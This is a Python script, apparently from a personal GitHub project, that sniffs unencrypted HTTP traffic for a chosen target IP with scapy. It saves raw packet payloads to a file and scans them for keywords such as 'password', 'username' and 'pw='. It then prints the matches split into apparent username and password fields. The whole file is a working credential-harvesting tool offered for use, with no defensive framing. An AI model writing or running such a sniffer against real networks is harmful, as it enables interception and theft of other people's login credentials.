#
#Author: Pulsar
#Python-Version: 3.7.5
#Github: https://github.com/Woodnet
#
from scapy.all import *
import sys,time
from colorama import *
from datetime import datetime

#colors 
w = Style.BRIGHT + Fore.WHITE 
c = Style.BRIGHT + Fore.CYAN 
g = Style.BRIGHT + Fore.GREEN 
r = Style.BRIGHT + Fore.RED 
y = Style.BRIGHT + Fore.YELLOW
#

os.system("clear")
words = [
    "passwords",
    "Passwords",
    "password", 
    "passwort", 
    "Passwort", 
    "Password",
    "usernames",
    "username=", 
    "username",
    "pw", 
    "pw=", 
    "Username", 
    "Usernames"
]

def gettime():
    n = datetime.now()
    now = "%s:%s:%s"%(n.hour,n.minute,n.second)
    return now

def welcome():
    print(w+"\n\n "+y+"<"+r+"--------"+y+">"+g+"    HTTP"+w+"Sniffer    "+y+"<"+r+"--------"+y+">\n\n")
    print(w+" ["+c+"#"+w+"] Author:"+g+" Pulsar")
    print(w+" ["+c+"#"+w+"] Creation Date:"+g+" 30.08.2020")
    print(w+" ["+c+"#"+w+"] Python-Version:"+g+" 3.7.5")
    print(w+" ["+c+"#"+w+"] Current Time:"+g+" %s"%(gettime()))
    print(w+" ["+c+"#"+w+"] Recommended OS:"+g+" Linux")
    print(w+" ["+y+"*"+w+"] _-Target-IP-_")

def gettarget():
    target_ip = input(w+"(default 127.0.0.1)$ ")
    if (target_ip == " " or target_ip == ""):
        target_ip = "127.0.0.1"     
    return target_ip

def httpsniffer(show):
    welcome()
    target_ip = gettarget()
    if (target_ip != "127.0.0.1" and target_ip != "localhost"):
        interface = "eth0" #default (Please change if you are not connected to the LAN or, when you are using an another interface!)
    else:
        interface = 'lo'
    print(w+"\n"+c+"KEY"+y+"WORDS"+g+"\n-->"+r+" \n\n%s\n\n"%(words)+g+"<--\n")
    print(w+" ["+y+"*"+w+"]"+r+" %s"%(len(words))+w+" available Key-Words")
    print(w+" ["+g+"+"+w+"] Started HttpSniffer")
    print(w+" ["+y+"*"+w+"] Show"+c+" %s "%(show)+w+"result(s)")
    print(w+" ["+y+"*"+w+"] Sniffing for HTTP-Packets on Interface"+y+" %s"%(interface)+w+"..")
    max = 160
    try:
        packets = sniff(filter="host %s and port 80"%(target_ip),count=max,iface=interface)
    except KeyboardInterrupt:
        print(w+" ["+g+"+"+w+"] Stopped!\n\n")
        quit()
    print(w+" ["+y+"*"+w+"] Get all Raws..")
    count = 0
    rawfile = open("raws.sniffer","a")
    while (count < max):
        try:
            raw = packets[count][Raw].load
            sys.stdout.write(w+"\r ["+g+"+"+w+"] Found "+g+"%s"%(count)+w+" RAW-Packets")
            sys.stdout.flush()
            #print(" [+] RAW: %s"%(raw))
            rawfile.write("%s\n"%(raw.decode()))
            #print(" [+] Added to the RAW-File")
        except:
            pass 
        count += 1 
    rawfile.close()
    print(w+"\n ["+y+"*"+w+"] Searching for Passwords and Usernames..")
    count = 0
    x = 0
    l = 0
    rawfile = open("raws.sniffer","r")
    Lines = rawfile.readlines()
    alllines = 0
    for a in Lines: 
        alllines += 1  
    for line in Lines:
        count += 1
        sys.stdout.write(w+"\r ["+y+"*"+w+"] Searching in Line"+y+" %s/%s.."%(count,alllines))
        sys.stdout.flush()
        #print(len(words))
        if(words[0] in line.strip() or words[1] in line.strip() or words[2] in line.strip() 
            or words[3] in line.strip() or words[4] in line.strip() or words[5] in line.strip() 
            or words[6] in line.strip()
            or words[7] in line.strip() or words[8] in line.strip() or words[9] in line.strip() 
            or words[10] in line.strip() 
            or words[11] in line.strip() or words[12] in line.strip()):
                print(w+"\n\n ["+g+"+"+w+"] Found a Password or/and Username in Line:"+g+" %s"%(count))
                try:
                    string = line.strip()
                    string.find('&')
                    cut_string = string.split('&')
                    username_string = cut_string[0]
                    password_string = cut_string[1]
                    print(w+" ["+g+"+"+w+"] RAW-Content:"+c+"\n "+w+"<|>"+c+"=> "+y+"%s"%(username_string)+w+"\n <|>"+c+"=> "+y+"%s\n\n"%(password_string))
                except:
                    print(w+" ["+g+"+"+w+"] RAW-Content:"+g+" %s\n\n"%(line.strip()))
                if (show == 1):
                    break
                if (show == 2):
                    x += 1
                    if (x == 2):
                        print(w+" ["+g+"+"+w+"] Found a Password or/and Username in Line:"+g+" %s"%(count))
                        try:
                            string = line.strip()
                            string.find('&')
                            cut_string = string.split('&')
                            username_string = cut_string[0]
                            password_string = cut_string[1]
                            print(w+" ["+g+"+"+w+"] RAW-Content:"+c+"\n "+w+"<|>"+c+"=> "+y+"%s"%(username_string)+w+"\n <|>"+c+"=> "+y+"%s\n\n"%(password_string))
                        except:
                            print(w+" ["+g+"+"+w+"] RAW-Content:"+g+" %s\n\n"%(line.strip()))
                        break 
        else:
            if (x == 1):
                x += 1
            else:
                if (count == alllines):
                    print(w+"\n ["+r+"!"+w+"] Nothing found anymore!")
                if (x == 1):
                    x += 1
                else:
                    pass   
    rawfile.close()

def continue_qu():
    print(w+" ["+y+"*"+w+"] Continue?")
    enter = input("[y|n]$ ")
    if (enter != "y" and enter != "n" and enter != "Y" and enter != "N"):
        print(w+" ["+y+"*"+w+"] I don't recongnize this command..")
        continue_qu()
    elif (enter == "y" or enter == "Y"):
        print(w+" ["+y+"*"+w+"] Continue..")
        clearfile()
        httpsniffer(show)
        continue_qu()
    elif (enter == "n" or enter == "N"):
        pass 

def clearfile():
    print(w+" ["+y+"*"+w+"] Clearing RAWs-File..")
    try:
        file = open("raws.sniffer","w")
        file.write(" ")
        file.close()
        print(w+" ["+g+"+"+w+"] Cleared")
    except:
        print(w+" ["+r+"!"+w+"] "+r+"Failed!"+w+" Could not write in File!")
        print(w+" ["+y+"*"+w+"] You need "+r+"ROOT-Rights!!!")

if __name__ == '__main__': 
    show = 1
    httpsniffer(show)
    try:
        continue_qu()
    except KeyboardInterrupt:
        print(w+"\n ["+g+"*"+w+"] Stopped!\n\n")
        quit()
    clearfile()
    print(w+" ["+y+"*"+w+"] Stopped.\n\n")
    
